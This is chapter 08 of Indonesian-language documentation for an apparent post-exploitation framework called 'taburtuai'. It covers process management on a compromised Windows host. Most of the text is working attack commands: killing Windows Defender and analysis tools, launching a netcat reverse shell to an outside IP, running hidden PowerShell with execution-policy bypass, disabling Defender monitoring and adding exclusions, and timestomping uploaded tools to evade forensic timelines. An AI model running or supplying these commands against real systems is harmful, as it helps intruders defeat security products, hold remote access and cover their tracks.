# 08 — Process Management

## List Proses

### `process list <id>`

Tampilkan semua proses yang berjalan di target.

```
taburtuai(IP:PORT) › process list 2703886d
```

```
[+] Process list (DESKTOP-QLPBF95):

PID    PPID   NAME                    USER                    SESSION
-----------------------------------------------------------------------
4      0      System                  NT AUTHORITY\SYSTEM     0
88     4      Registry                NT AUTHORITY\SYSTEM     0
...
724    656    lsass.exe               NT AUTHORITY\SYSTEM     0
864    724    svchost.exe             NT AUTHORITY\SYSTEM     0
1284   864    MsMpEng.exe             NT AUTHORITY\SYSTEM     0
2164   864    RuntimeBroker.exe       DESKTOP-QLPBF95\windows 1
3048   2792   explorer.exe            DESKTOP-QLPBF95\windows 1
4512   3048   chrome.exe              DESKTOP-QLPBF95\windows 1
5824   1      cmd.exe                 DESKTOP-QLPBF95\windows 1
...
```

### Analisis dari Process List

**Proses yang dicari saat post-exploitation:**

```
# Security products
MsMpEng.exe        ← Windows Defender
SentinelAgent.exe  ← SentinelOne
CylanceSvc.exe     ← Cylance
CrowdStrike*       ← CrowdStrike Falcon
MBAMService.exe    ← Malwarebytes

# Proses menarik untuk injection target
explorer.exe       ← User session, stabil
RuntimeBroker.exe  ← Trusted Microsoft process
spoolsv.exe        ← Print Spooler (SYSTEM)
svchost.exe        ← Generic host (banyak instance)

# Proses yang menunjukkan aktifitas user
chrome.exe / firefox.exe / msedge.exe  ← Browser aktif
outlook.exe        ← Email client terbuka
WINWORD.EXE        ← Word sedang buka
```

---

## Kill Proses

### Kill Berdasarkan PID

```
taburtuai(IP:PORT) › process kill 2703886d --pid 4512
```

```
[+] Process 4512 (chrome.exe) terminated.
```

### Kill Berdasarkan Nama

```
taburtuai(IP:PORT) › process kill 2703886d --name chrome.exe
```

```
[+] Killed 2 process(es) named 'chrome.exe'.
```

### Contoh Kill Proses

```
# Matikan AV (butuh elevated privilege)
process kill 2703886d --name MsMpEng.exe
process kill 2703886d --pid 1284

# Matikan proses user yang mungkin deteksi kita
process kill 2703886d --name procexp64.exe   # Process Explorer
process kill 2703886d --name Wireshark.exe   # Wireshark

# Matikan aplikasi yang sedang lock file yang ingin kita akses
process kill 2703886d --name WINWORD.EXE
```

> **Catatan:** Mematikan security product butuh elevated privilege (admin/SYSTEM).
> Tanpa privilege yang cukup, perintah akan gagal.

---

## Start Proses

### `process start <id> <exe-path>`

Jalankan binary baru di target.

```
taburtuai(IP:PORT) › process start 2703886d "C:\Windows\System32\calc.exe"
```

```
[+] Process started: calc.exe (PID: 6720)
```

### Contoh Start Proses

```
# Jalankan calc sebagai test
process start 2703886d "C:\Windows\System32\calc.exe"

# Jalankan tool yang sudah diupload
process start 2703886d "C:\Temp\nc.exe" --args "172.23.0.118 4444 -e cmd.exe"

# Jalankan PowerShell hidden
process start 2703886d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
  --args "-w hidden -ep bypass -f C:\Temp\script.ps1"
```

---

## Skenario: Identifikasi EDR dan Tindakan

### Langkah 1: List Proses untuk Cari Security Product

```
taburtuai(IP:PORT) › process list 2703886d
# Perhatikan proses yang berjalan
```

### Langkah 2: Identifikasi EDR

```
# Filter dari shell
cmd 2703886d "tasklist | findstr /i \"defender crowdstrike sentinel cylance endpoint carbon\""
```

### Langkah 3: Tindakan Berdasarkan EDR

**Windows Defender (tanpa EDR tambahan):**
```
# Disable via PowerShell (butuh admin)
cmd 2703886d "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring \$true\""
cmd 2703886d "powershell -c \"Add-MpPreference -ExclusionPath C:\Temp\""
```

**EDR yang lebih advanced:**
Lebih baik gunakan teknik evasion daripada coba matikan EDR:
- Lihat [11 — Evasion](11-evasion.md) untuk AMSI/ETW bypass
- Lihat [10 — Injection](10-injection.md) untuk inject ke trusted process

---

## Timestomp — Manipulasi Timestamp File

Ganti timestamp file agar terlihat seperti file lama yang bukan baru dibuat.
Berguna untuk menyembunyikan tool yang baru diupload dari forensik timeline analysis.

### `timestomp <id> <target-file>`

```
# Copy timestamp dari kernel32.dll (file sistem yang legitimate)
timestomp 2703886d "C:\Temp\tool.exe"
```

```
[+] Timestamps copied from C:\Windows\System32\kernel32.dll
    Modified : 2019-12-07 09:14:00 (was 2026-04-23 16:30:00)
    Created  : 2019-12-07 09:14:00 (was 2026-04-23 16:29:58)
    Accessed : 2019-12-07 09:14:00 (was 2026-04-23 16:30:01)
```

### Menggunakan File Referensi Lain

```
# Copy timestamp dari file explorer.exe
timestomp 2703886d "C:\Temp\tool.exe" --ref "C:\Windows\explorer.exe"

# Copy dari file yang punya tanggal spesifik
timestomp 2703886d "C:\Temp\tool.exe" --ref "C:\Windows\System32\notepad.exe"
```

### Set Timestamp Eksplisit

```
# Set timestamp ke tanggal spesifik
timestomp 2703886d "C:\Temp\tool.exe" --time "2021-06-15T09:00:00Z"
```

### Kenapa Penting

Forensic analyst sering melihat timeline: semua file dengan timestamp yang sama atau
baru = mencurigakan. Dengan timestomp, file tool kamu terlihat seperti file lama
yang sudah ada sebelum engagement dimulai.

---

**Selanjutnya:** [09 — Stager & Delivery](09-stager.md)
